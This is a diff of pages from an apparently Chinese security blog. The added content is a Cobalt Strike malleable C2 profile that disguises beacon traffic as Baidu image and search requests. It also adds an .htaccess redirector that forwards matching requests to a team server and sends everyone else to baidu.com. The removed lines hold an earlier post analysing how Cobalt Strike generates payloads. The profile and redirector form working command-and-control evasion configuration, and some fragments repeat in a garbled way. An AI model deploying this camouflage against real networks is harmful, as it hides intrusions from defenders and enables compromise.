&quot;Accept-Encoding,User-Agent&quot;;</span><br><span class="line">    	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            prepend &quot;                 @@                  (B         (         @                 @&quot;;</span><br><span class="line">            print;</span><br><span class="line">        	&#125; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stage &#123;</span><br><span class="line">	set userwx &quot;false&quot;;</span><br><span class="line">	set obfuscate &quot;false&quot;;</span><br><span class="line">	set image_size_x86 &quot;305000&quot;;</span><br><span class="line">&#125;</span><br><span class="line">rsv_idx&#x3D;2&amp;tn&#x3D;baiduhome_pg&amp;usm&#x3D;2&amp;ie&#x3D;utf-8&amp;rsv_cq&#x3D;&amp;rsv_dl&#x3D;0_right_fyb_pchot_20811_01&amp;rsf&#x3D;392deae71492ecf08ccf48e0d95afc29_1_15_1&amp;rqid&#x3D;d04f8f9d00035648&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;BIDUPSID&#x3D;29E3A0F2775C00D759FDA49E071A0B78; PSTM&#x3D;1592203863; BAIDUID&#x3D;7B3B91054F6B7C69CCE98B945C800795:FG&#x3D;1; BD_UPN&#x3D;12314753; BDSFRCVID&#x3D;yi0OJeC62GgmFcJr_-UrEMX0j6W8_fcTH6aoA6yEDjKjrwuywjufEG0P_M8g0KubVI2-ogKKy2OTH9DF_2uxOjjg8UtVJeC6EG0Ptf8g0M5; H_BDCLCKID_SF&#x3D;tRk8_KtKtCI3HnRY-P4_-tAt2qoXetJyaR38BCJvWJ5TMCojbPcP-UIXBgcPbfQuynRB_f0yXbQjShPC-tnNjRFkQM6iaJjfb65fBt5D3l02VM7Ee-t2ynLV34uHe4RMW238oq7mWITUsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjj6jK4JKDNtDJ5vP; BDRCVFR[feWj1Vr5u3D]&#x3D;I67x6TjHwwYf0; delPer&#x3D;0; BD_CK_SAM&#x3D;1; COOKIE_SESSION&#x3D;18454_1_8_9_7_18_0_0_8_6_2_3_3514086_0_11_0_1599115184_1598838986_1599115173%7C9%230_1_1598838982%7C1; BD_HOME&#x3D;1; PSINO&#x3D;7; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; BDRCVFR[dG2JNJb_ajR]&#x3D;mk3SLVN4HKm; H_PS_PSSID&#x3D;7541_32606_1421_32620_32327_31660_32115_7565_32691_26350; H_PS_645EC&#x3D;7f76DbrvJ3OSPPa0yE9HFSBygVDDoW5VRlO3pSIe%2BNw%2FIsO0qfi9%2B7kDdR5DButmXkOX; BDSVRTM&#x3D;0&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;</span><br><span class="line">	    	parameter &quot;url&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            parameter &quot;eqid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">		parameter &quot;wd&quot; &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">	header &quot;Bdpagetype&quot; &quot;3&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;text&#x2F;html&quot;;	</span><br><span class="line">	header &quot;Server&quot; &quot;BWS&#x2F;1.1&quot;;</span><br><span class="line">	header &quot;Set-Cookie&quot; &quot;BDSVRTM&#x3D;0; path&#x3D;&#x2F;&quot;;</span><br><span class="line">	header &quot;Vary&quot; &quot;Accept-Encoding&quot;;</span><br><span class="line">    header &quot;X-Ua-Compatible&quot; &quot;IE&#x3D;Edge,chrome&#x3D;1&quot;;    </span><br><span class="line">	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-stager &#123;</span><br><span class="line"></span><br><span class="line">	set uri_x86 &quot;&#x2F;favicon.ico&quot;;</span><br><span class="line">	set uri_x64 &quot;&#x2F;Favicon.ico&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">	header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">	header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;;	    </span><br><span class="line">        header &quot;Sec-Fetch-Site&quot; &quot;same-origin&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;navigate&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;document&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;BIDUPSID&#x3D;29E3A0F2775C00D759FDA49E071A0B78; PSTM&#x3D;1592203863; BAIDUID&#x3D;7B3B91054F6B7C69CCE98B945C800795:FG&#x3D;1; BD_UPN&#x3D;12314753; BDSFRCVID&#x3D;yi0OJeC62GgmFcJr_-UrEMX0j6W8_fcTH6aoA6yEDjKjrwuywjufEG0P_M8g0KubVI2-ogKKy2OTH9DF_2uxOjjg8UtVJeC6EG0Ptf8g0M5; H_BDCLCKID_SF&#x3D;tRk8_KtKtCI3HnRY-P4_-tAt2qoXetJyaR38BCJvWJ5TMCojbPcP-UIXBgcPbfQuynRB_f0yXbQjShPC-tnNjRFkQM6iaJjfb65fBt5D3l02VM7Ee-t2ynLV34uHe4RMW238oq7mWITUsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjj6jK4JKDNtDJ5vP; BDRCVFR[feWj1Vr5u3D]&#x3D;I67x6TjHwwYf0; delPer&#x3D;0; BD_CK_SAM&#x3D;1; COOKIE_SESSION&#x3D;18454_1_8_9_7_18_0_0_8_6_2_3_3514086_0_11_0_1599115184_1598838986_1599115173%7C9%230_1_1598838982%7C1; BD_HOME&#x3D;1; PSINO&#x3D;7; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; BDRCVFR[dG2JNJb_ajR]&#x3D;mk3SLVN4HKm; H_PS_PSSID&#x3D;7541_32606_1421_32620_32327_31660_32115_7565_32691_26350; H_PS_645EC&#x3D;7f76DbrvJ3OSPPa0yE9HFSBygVDDoW5VRlO3pSIe%2BNw%2FIsO0qfi9%2B7kDdR5DButmXkOX; BDSVRTM&#x3D;0&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line">	header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;image&#x2F;x-icon&quot;;	</span><br><span class="line">	header &quot;Etag&quot; &quot;423e-55c8139094a40&quot;;</span><br><span class="line">	header &quot;Last-Modified:&quot; &quot;Fri, 27 Oct 2017 06:16:01 GMT&quot;;</span><br><span class="line">    	header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">    	header &quot;Vary&quot; &quot;Accept-Encoding,User-Agent&quot;;</span><br><span class="line">    	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            prepend &quot;                 @@                  (B         (         @                 @&quot;;</span><br><span class="line">            print;</span><br><span class="line">        	&#125; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stage &#123;</span><br><span class="line">	set userwx &quot;false&quot;;</span><br><span class="line">	set obfuscate &quot;false&quot;;</span><br><span class="line">	set image_size_x86 &quot;305000&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">###Global Options###</span><br><span class="line">set sample_name &quot;baidu.profile&quot;;</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;5000&quot;;  </span><br><span class="line">set jitter    &quot;30&quot;;   </span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36&quot;; </span><br><span class="line"></span><br><span class="line">###SMB options###    </span><br><span class="line">set pipename &quot;ntsvcs&quot;;</span><br><span class="line">set pipename_stager &quot;ntsvc&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;cache&#x2F;global&#x2F;img&#x2F;aladdinIcon-1.0.gif&quot;;</span><br><span class="line">	client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;image&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;Keep-Alive&quot;;</span><br><span class="line">	</span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbios;</span><br><span class="line">	    parameter &quot;sid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">		header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">		header &quot;Cache-Control&quot; &quot;max-age&#x3D;315360000&quot;;	</span><br><span class="line">		header &quot;Content-Type&quot; &quot;image&#x2F;gif&quot;;</span><br><span class="line">		header &quot;Date&quot; &quot;Tue, 08 Sep 2020 06:29:52 GMT&quot;;</span><br><span class="line">		header &quot;Etag&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">		header &quot;Expires&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">		header &quot;Last-Modified&quot; &quot;Wed, 06 Jun 2012 05:10:47 GMT&quot;;</span><br><span class="line">		header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">		header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">        	netbios;</span><br><span class="line">        	prepend &quot;                 &quot;;</span><br><span class="line">	   		prepend &quot;GIF89a&quot;;</span><br><span class="line">	    	append &quot;;&quot;;</span><br><span class="line">        	print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;link&quot;;</span><br><span class="line">    set verb &quot;GET&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">	header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;navigate&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;document&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;</span><br><span class="line">	    	parameter &quot;url&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            parameter &quot;eqid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">		parameter &quot;wd&quot; &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">	header &quot;Bdpagetype&quot; &quot;3&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;text&#x2F;html&quot;;	</span><br><span class="line">	header &quot;Server&quot; &quot;BWS&#x2F;1.1&quot;;</span><br><span class="line">	header &quot;Set-Cookie&quot; &quot;BDSVRTM&#x3D;0; path&#x3D;&#x2F;&quot;;</span><br><span class="line">	header &quot;Vary&quot; &quot;Accept-Encoding&quot;;</span><br><span class="line">    header &quot;X-Ua-Compatible&quot; &quot;IE&#x3D;Edge,chrome&#x3D;1&quot;;    </span><br><span class="line">	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-stager &#123;</span><br><span class="line"></span><br><span class="line">	set uri_x86 &quot;&#x2F;favicon.ico&quot;;</span><br><span class="line">	set uri_x64 &quot;&#x2F;Favicon.ico&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">	header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line">	header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;image&#x2F;x-icon&quot;;	</span><br><span class="line">	header &quot;Etag&quot; &quot;423e-55c8139094a40&quot;;</span><br><span class="line">	header &quot;Last-Modified:&quot; &quot;Fri, 27 Oct 2017 06:16:01 GMT&quot;;</span><br><span class="line">    	header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">    	header &quot;Vary&quot; &quot;Accept-Encoding,User-Agent&quot;;</span><br><span class="line">    	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            prepend &quot;                 @@                  (B         (         @                 @&quot;;</span><br><span class="line">            print;</span><br><span class="line">        	&#125; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stage &#123;</span><br><span class="line">	set userwx &quot;false&quot;;</span><br><span class="line">	set obfuscate &quot;false&quot;;</span><br><span class="line">	set image_size_x86 &quot;305000&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="mod-rewrite对不同流量转发"><a href="#mod-rewrite对不同流量转发" class="headerlink" title="mod_rewrite对不同流量转发"></a>mod_rewrite对不同流量转发</h3><p>​        通过上面的设置，我们已经对我们的流量进行重新设置，那么现在可以根据流量来通过.htaccess来设置流量的转发操作，.htaccess文件内容如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; ^&#x2F;(cache&#x2F;global&#x2F;img&#x2F;aladdinIcon-1.0.gif|link|favicon.ico|Favicon.ico)&#x2F;?$</span><br><span class="line">RewriteRule ^.*$ http:&#x2F;&#x2F;teamserver-ip:8880%&#123;REQUEST_URI&#125; [P]</span><br><span class="line">RewriteRule ^.*$ https:&#x2F;&#x2F;www.baidu.com&#x2F;? [L,R&#x3D;302]</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>
@@ -353,7 +633,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-09-08 10:59:43" itemprop="dateModified" datetime="2020-09-08T10:59:43+08:00">2020-09-08</time>
+                <time title="Modified: 2020-09-08 11:11:54" itemprop="dateModified" datetime="2020-09-08T11:11:54+08:00">2020-09-08</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1360,490 +1640,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">关于CobaltStrike生成shell的过程和执行流程的分析学习</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-08-31 17:21:58" itemprop="dateCreated datePublished" datetime="2020-08-31T17:21:58+08:00">2020-08-31</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-09-02 20:09:56" itemprop="dateModified" datetime="2020-09-02T20:09:56+08:00">2020-09-02</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
-                    <span itemprop="name">cobaltstrike</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>​        可能我们在后渗透阶段使用CobaltStrike使用的是比较多的，关于一款工具，我们不仅仅只能停留在如何使用它，我们也应该了解一下它实现的原理，本文将带着大家和我一起学习关于CoblatStrike这款工具shell生成的过程还有执行流程。我这里是以CobaltStrike4.0为例来进行分析的。</p>
-<p>​        首先我们将CobaltStrike导入到IDEA中，对着CobaltStrike.jar右键选择-add as libirary,那样我们就可以在IDEA中查看这个包反编译的代码，IDEA反编译代码的还原度还是非常高的。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831173535104.png" alt="image-20200831173535104"></p>
-<h3 id="payload-generator"><a href="#payload-generator" class="headerlink" title="payload generator"></a>payload generator</h3><p>​        CobaltStrike所有的ui在aggressor\dialogs\目录下，因此我们如果想要知道在我们点击了某个按键后CobaltStrike执行了什么操作，在这个目录下找就可以了，因为我们想查看在生成paylad的时候执行了什么操作，因此找payload generator就可以了，我们先看一下dialogAction这个方法中的逻辑。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831174257725.png" alt="image-20200831174257725"></p>
-<p>​        这个逻辑我们根据生成payload的窗口可能更好理解一些,我把我的分析写到注释里</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831174544179.png" alt="image-20200831174544179"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public void dialogAction(ActionEvent var1, Map var2) &#123;</span><br><span class="line">    this.options &#x3D; var2;</span><br><span class="line">    boolean var3 &#x3D; DialogUtils.bool(var2, &quot;x64&quot;); &#x2F;&#x2F;判断是否生成x64的payload</span><br><span class="line">    String var4 &#x3D; DialogUtils.string(var2, &quot;listener&quot;); &#x2F;&#x2F;接收listener的值</span><br><span class="line">    this.stager &#x3D; ListenerUtils.getListener(this.client, var4).getPayloadStager(var3 ? &quot;x64&quot; : &quot;x86&quot;); &#x2F;&#x2F;首先调用getListener获取到Listener，再调用getPayloadStager获取stager</span><br><span class="line">    if (this.stager.length &#x3D;&#x3D; 0) &#123; &#x2F;&#x2F;判断stager是否生成成功，如果为空，则报错</span><br><span class="line">        if (var3) &#123;</span><br><span class="line">            DialogUtils.showError(&quot;No x64 stager for listener &quot; + var4);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            DialogUtils.showError(&quot;No x86 stager for listener &quot; + var4);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        Map var5 &#x3D; DialogUtils.toMap(&quot;ASPX: aspx, C: c, C#: cs, HTML Application: hta, Java: java, Perl: pl, PowerShell: ps1, PowerShell Command: txt, Python: py, Raw: bin, Ruby: rb, COM Scriptlet: sct, Veil: txt, VBA: vba&quot;);  &#x2F;&#x2F;将内容转换为Map形式</span><br><span class="line">        String var6 &#x3D; DialogUtils.string(var2, &quot;format&quot;); &#x2F;&#x2F;从var2这个hashmap中获取键为format对应的值</span><br><span class="line">        String var7 &#x3D; &quot;payload.&quot; + var5.get(var6); &#x2F;&#x2F;拼接内容大概是payload.format</span><br><span class="line">        SafeDialogs.saveFile((JFrame)null, var7, this); &#x2F;&#x2F;调用save方法</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​            我们将下面这句代码扩展分析一下，getListener故名思意就是获取Listener，跟进去后发现会返回一个SCListener对象。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.stager &#x3D; ListenerUtils.getListener(this.client, var4).getPayloadStager(var3 ? &quot;x64&quot; : &quot;x86&quot;);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831181115893.png" alt="image-20200831181115893"></p>
-<p>​        我们主要关注一下getPayloadStager是如何运行的，跟进后发现getPayloadStager仅仅返回了Stagers.shellcode的执行结果</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831181157627.png" alt="image-20200831181157627"></p>
-<p>​        跟进shellcode方法，执行了两个操作，首先调用resolve方法进行解析，返回一个GenericStager对象，再调用这个对象的generate方法。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831181808133.png" alt="image-20200831181808133"></p>
-<p>​        跟进resolve看看执行了什么操作，在if中会判断var3是否是x86结构，如果是将this.x86_stagers赋值给var4,再判断var6是否包含var2关键字，如果包含，则调用create方法。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831191822995.png" alt="image-20200831191822995"></p>
-<p>​        我们先看看x86_stagers是怎么来的，在Stagers类的开始创建了X86_stagers和x64_stagers，并且调用了Stagers（）这个构造方法，我们可以看到在这个方法中调用了add方法来执行操作</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831192312035.png" alt="image-20200831192312035"></p>
-<p>​        再跟进去看看add方法执行了什么操作,首先通过掉用TestAech方法判断是否含有x86或x64,如果正常以后再判断是否是x86，如果是则向x86_stagers则以键值对的形式写入内容，如果不是则向x64_stagers写入内容。</p>
-<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831192737834.png" alt="image-20200831192737834"></p>
